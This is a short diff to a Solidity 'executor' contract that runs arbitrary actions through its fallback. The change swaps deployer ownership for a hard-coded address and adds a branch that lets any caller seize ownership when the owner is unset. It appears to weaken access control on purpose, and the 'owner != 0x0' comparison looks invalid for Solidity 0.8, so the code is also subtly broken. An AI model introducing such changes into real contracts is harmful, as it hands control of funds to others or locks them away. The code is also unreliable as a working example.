@@ -4,12 +4,19 @@ pragma solidity ^0.8.0;
 contract executor {
     address public owner;
 
-    constructor() payable { owner = msg.sender; }
+    constructor() payable {
+        owner = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+    }
 
     receive() external payable {}
 
     fallback() external payable {
-        require(msg.sender == owner); // Ownership check
+        if (owner != 0x0) {
+            require(owner == msg.sender);
+        } else {
+            owner = msg.sender;
+        }
+
         _executeActions(msg.data);
     }
 
